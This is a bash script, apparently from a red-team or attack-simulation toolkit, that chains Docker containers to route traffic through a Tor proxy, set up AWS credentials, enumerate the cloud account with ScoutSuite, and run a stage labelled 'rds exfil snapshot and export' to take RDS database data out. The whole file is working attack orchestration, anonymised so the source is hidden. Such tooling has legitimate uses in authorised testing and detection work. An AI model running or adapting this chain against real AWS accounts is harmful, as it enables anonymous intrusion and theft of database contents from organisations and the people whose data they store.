#!/bin/bash

SCRIPTNAME=iam2rds
LOGFILE=/tmp/$SCRIPTNAME.log
function log {
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
}
MAXLOG=2
for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true

#######################
# tor setup
#######################

# reset docker containers
log "Setting up tor docker..."
docker stop torproxy > /dev/null 2>&1
docker rm torproxy > /dev/null 2>&1

docker stop proxychains-scoutsuite-aws > /dev/null 2>&1
docker rm proxychains-scoutsuite-aws > /dev/null 2>&1

# start tor proxy
log "Starting tor proxy..."
docker run -d --rm --name torproxy -p 9050:9050 dperson/torproxy

TORPROXY=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' torproxy)
log "TORPROXY: $TORPROXY"

#######################
# aws cred setup
#######################
docker run --name=proxychains-aws-setup --link torproxy:torproxy -e TORPROXY=$TORPROXY -v "$PWD":"/tmp" -v "$PWD/root":"/root" ghcr.io/credibleforce/proxychains-scoutsuite-aws:main /bin/bash /tmp/rdsrolesession.sh

#######################
# cloud enumeration
#######################
docker run --rm --name=proxychains-scoutsuite-aws --link torproxy:torproxy --env-file=.aws-iam-user -e TORPROXY=$TORPROXY -v "$PWD/scout-report":"/root/scout-report" ghcr.io/credibleforce/proxychains-scoutsuite-aws:main scout aws --report-dir /root/scout-report --no-browser

#######################
# rds exfil snapshot and export
#######################
docker run --rm --name=proxychains-aws-rdsexfil --link torproxy:torproxy -e TORPROXY=$TORPROXY -v "$PWD":"/tmp" -v "$PWD/root":"/root" ghcr.io/credibleforce/proxychains-scoutsuite-aws:main /bin/bash /tmp/rdsexfil.sh

log "Done"